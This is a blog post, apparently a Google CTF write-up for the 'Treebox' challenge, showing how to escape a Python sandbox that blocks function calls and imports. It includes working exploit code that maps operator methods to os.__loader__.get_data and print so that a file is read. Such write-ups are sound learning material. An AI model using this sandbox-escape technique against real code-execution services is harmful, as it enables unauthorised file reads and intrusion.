<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Treebox - lavafroth</title><meta name=description content='This challenge asks for python code as an input, converts it into an AST (abstract syntax tree) and if there aren&rsquo;t any function calls or imports, executes the code. Our goal here is to avoid explicitly calling any functions yet reading the flag located at flag. We also can&rsquo;t import any modules explicitly. If we read the source code provided for the challenge, we can observe that the sys module is already imported. We can piggyback on this fact to use its modules.'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><link rel=preload as=image href=../../header.svg><noscript><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/noscript.min.css></noscript><link rel=preload as=font href=https://lavafroth.is-a.dev/LeagueGothic.ttf><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.png><link rel=blog-icon href=https://lavafroth.is-a.dev/icon.png></head><body class=not-ready data-menu=true><header class=header><h1><a class=site-name href=https://lavafroth.is-a.dev/>lavafroth</a></h1><svg id="btnDark" class="btn-dark" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 60 60" preserveAspectRatio="xMinYMin meet"><path class="circle" d="M30 16c7.73.0 14 6.27 14 14 0 3.81-1.53 7.27-4 9.8-2.54 2.59-6.08 4.2-10 4.2-7.73.0-14-6.27-14-14 0-7.73 6.27-14 14-14z"/><g class="rays" data-svg-origin="30 30"><line class="line" x1="30" y1="11" x2="30" y2="7"/><line class="line" x1="43.44" y1="16.57" x2="46.26" y2="13.74"/><line class="line" x1="49" y1="30" x2="53" y2="30"/><line class="line" x1="43.43" y1="43.44" x2="46.26" y2="46.26"/><line class="line" x1="30" y1="49" x2="30" y2="53"/><line class="line" x1="16.56" y1="43.43" x2="13.74" y2="46.26"/><line class="line" x1="11" y1="30" x2="7" y2="30"/><line class="line" x1="16.57" y1="16.56" x2="13.74" y2="13.74"/></g></svg><div class=push></div><a style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a><script>const bodyClx=document.body.classList,sysDark=window.matchMedia("(prefers-color-scheme: dark)"),darkVal=localStorage.getItem("dark"),setDark=e=>(bodyClx.toggle("dark",e),localStorage.setItem("dark",e));setDark(darkVal?darkVal==="true":sysDark.matches),requestAnimationFrame(()=>bodyClx.remove("not-ready")),btnDark.addEventListener("click",()=>setDark(!bodyClx.contains("dark"))),sysDark.addEventListener("change",({matches:e})=>setDark(e))</script></header><main class=main><article class=post-single><header class=post-title><p><time>Aug 19, 2022 | 2 minutes read</time></p><h1 data-pagefind-meta=title>Treebox</h1></header><section class=post-content data-pagefind-body><p>This challenge asks for python code as an input, converts it into an AST (abstract syntax tree) and if there aren&rsquo;t any function calls or imports, executes the code. Our goal here is to avoid explicitly calling any functions yet reading the flag located at <code>flag</code>. We also can&rsquo;t import any modules explicitly. If we read the source code provided for the challenge, we can observe that the <code>sys</code> module is already imported. We can piggyback on this fact to use its modules.</p><p>We shall, however, first find all the modules in <code>sys.modules</code> that have a <code>get_data</code> like function in their <code>__loader__</code> attribute. To do so, we run the following locally:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> name, handle <span style=color:#f92672>in</span> sys<span style=color:#f92672>.</span>modules<span style=color:#f92672>.</span>items():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> loader <span style=color:#f92672>:=</span> getattr(handle, <span style=color:#e6db74>&#39;__loader__&#39;</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> loader_function_name <span style=color:#f92672>in</span> dir(loader):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;get_data&#39;</span> <span style=color:#f92672>in</span> loader_function_name:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;sys.modules[&#39;</span><span style=color:#e6db74>{</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;].__loader__.</span><span style=color:#e6db74>{</span>loader_function_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>From the output we get, this looks the most promising:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>sys<span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#34;os&#34;</span>]<span style=color:#f92672>.</span>__loader__<span style=color:#f92672>.</span>get_data
</span></span></code></pre></div><p>Now we can slowly assemble our exploit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Read</span>(<span style=color:#a6e22e>BaseException</span>):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set the addition operator to the str function</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># so that we can use it to stringify bytes-like</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># objects.</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__add__</span> <span style=color:#f92672>=</span> str
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set the division operator to os.loader.get_data method</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># which can be used to read the raw bytes from a file.</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__truediv__</span> <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#34;os&#34;</span>]<span style=color:#f92672>.</span>__loader__<span style=color:#f92672>.</span>get_data
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set the indexing operator to print, which we&#39;ll use to</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print the flag</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__getitem__</span> <span style=color:#f92672>=</span> print
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># Now we read the raw bytes of the file &#34;flag&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># stringify it and finally print it</span>
</span></span><span style=display:flex><span>        self[self <span style=color:#f92672>+</span> self <span style=color:#f92672>/</span> <span style=color:#e6db74>&#34;flag&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Raise the exception</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>raise</span> Read
</span></span></code></pre></div></section></article><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/google-ctf class=list-tag>Google CTF</a>
<a href=https://lavafroth.is-a.dev/tags/ctf class=list-tag>CTF</a>
<a href=https://lavafroth.is-a.dev/tags/python class=list-tag>Python</a>
<a href=https://lavafroth.is-a.dev/tags/ast class=list-tag>AST</a>
<a href=https://lavafroth.is-a.dev/tags/sandbox-escape class=list-tag>Sandbox Escape</a></footer><nav class=post-nav><a class=prev href=https://lavafroth.is-a.dev/post/picoctf-cryptography-pixelated/><span>←</span><span>Pixelated</span></a>
<a class=next href=https://lavafroth.is-a.dev/post/r0-i-saw-a-little-elf/><span>I Saw a Little Elf</span><span>→</span></a></nav></main><footer class=footer><p>&copy; 2025 <a href=https://lavafroth.is-a.dev/>lavafroth</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a></p><p><a href=https://lavafroth.is-a.dev/privacy>Privacy</a></p><p><a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>